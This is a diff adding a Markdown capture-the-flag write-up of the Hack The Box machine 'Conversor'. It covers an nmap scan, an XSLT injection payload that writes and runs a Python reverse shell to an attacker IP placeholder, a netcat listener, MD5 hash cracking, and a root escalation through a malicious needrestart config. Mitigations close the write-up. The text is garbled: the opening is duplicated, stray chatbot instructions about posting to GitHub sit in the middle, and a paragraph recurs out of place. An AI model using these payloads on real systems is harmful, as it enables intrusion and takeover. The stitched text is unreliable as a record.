@@ -1,0 +1,155 @@
+# HTB Machine Writeup: Conversor 
+
+**Date:** March 19, 2026  
+**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Conversor)  
+**Difficulty:** Medium  
+**Category:** Web / Linux
+
+---
+
+## 1. Initial Enumeration
+
+### Nmap Scan
+I started with a standard service and script scan to identify open ports and versions.
+
+```bash
+nmap -sV -sC -T4 10.129.8.152
+
+
+Results:
+
+Port 22/tcp: SSH (OpenSSH 8.9p1 Ubuntu)
+Port 80/tcp: HTTP (Apache 2.4.52). Note: Redirects to http://conversor.htb/.
+
+Note: Ensure you add the target to your hosts file:
+
+echo "10.129.8.152  conversor.htb" | sudo tee -a /etc/hosts
+
+
+2. Source Code Analysis
+By examining the provided source_code.tar.gz, I identified a Flask-based application. The file structure revealed:
+
+app.py: The core application logic.
+
+instance/users.db: A SQLite database containing user credentials.
+
+static/nmap.xslt: An XSL template used for processing data.
+
+Since you are posting this on GitHub, we will use Markdown (.md) formatting. GitHub renders Markdown beautifully, making your code blocks look like a real terminal and your headings clear and professional.
+
+Create a new file in your repository (e.g., Conversor/README.md) and paste the following content exactly:
+
+Markdown
+# HTB Machine Writeup: Conversor 🛡️
+
+**Date:** March 19, 2026  
+**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Conversor)  
+**Difficulty:** Medium  
+**Category:** Web / Linux
+
+---
+
+## 1. Initial Enumeration
+
+### Nmap Scan
+I started with a standard service and script scan to identify open ports and versions.
+
+```bash
+nmap -sV -sC -T4 10.129.8.152
+Results:
+
+Port 22/tcp: SSH (OpenSSH 8.9p1 Ubuntu)
+
+Port 80/tcp: HTTP (Apache 2.4.52). Note: Redirects to http://conversor.htb/.
+
+Note: Ensure you add the target to your hosts file:
+
+echo "10.129.8.152  conversor.htb" | sudo tee -a /etc/hosts
+
+2. Source Code Analysis
+By examining the provided source_code.tar.gz, I identified a Flask-based application. The file structure revealed:
+
+app.py: The core application logic.
+
+instance/users.db: A SQLite database containing user credentials.
+
+static/nmap.xslt: An XSL template used for processing data.
+
+The application takes XML input and processes it using XSLT. This is a classic entry point for XSLT Injection.
+
+3. Exploitation (XSLT Injection to RCE)
+Since the XSLT processor allows extensions, we can use the exploit:document function to write a malicious Python script directly into the server's script directory.
+
+Step 1: Create the Malicious XSLT
+This payload writes a reverse shell script named shell.py into the web directory.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet xmlns:xsl="[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)" 
+                xmlns:exploit="[http://exslt.org/common](http://exslt.org/common)" 
+                extension-element-prefixes="exploit" 
+                version="1.0">
+  <xsl:template match="/">
+    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("YOUR_HTB_VPN_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/sh")
+    </exploit:document>
+  </xsl:template>
+</xsl:stylesheet>
+
+Step 2: Trigger the Execution
+Start a netcat listener on your local machine:
+
+nc -lnvp 4444
+
+Upload the crafted XML/XSLT. Once the server processes it, the shell is written and executed, granting us a reverse shell.
+
+4. Lateral Movement (fismathack)
+The reverse shell gives us limited access as the web user. To move to a real user, we check instance/users.db.
+
+Dump Database: Extract hashes from the users table.
+
+Crack Hash: Found user fismathack. The password hash was cracked via CrackStation (MD5).
+
+SSH Access:
+ssh fismathack@conversor.htb
+
+User Flag: 27eb... (captured) ✅
+
+
+5. Privilege Escalation (Root)
+Checking for sudo permissions and system configurations, I found needrestart was present. This version is vulnerable to a local privilege escalation.
+
+The Exploit
+We create a custom configuration file that forces needrestart to execute a bash shell with root privileges.
+
+# Clean up any old exploit files
+rm -rf /tmp/exploit.conf 
+
+# Create the malicious config
+cat > /tmp/exploit.conf << 'EOF'
+$nrconf{restart} = 'a';
+exec("/bin/bash -p");
+EOF
+
+# Trigger the exploit
+sudo /usr/sbin/needrestart -c /tmp/exploit.conf
+
+Successfully escalated to root!
+
+Root Flag: 2727eb..................3753cf30 ✅
+
+The application takes XML input and processes it using XSLT. This is a classic entry point for XSLT Injection.
+
+
+6. Conclusion & Mitigations
+XSLT Security: Always disable the use of external entities and dangerous extensions like exslt:document in your XSLT processor.
+
+Password Hashing: Move away from MD5. Use robust, salted algorithms like Argon2 or BCrypt.
+
+Patch Management: Regularly update system utilities like needrestart to patch known privilege escalation vulnerabilities.
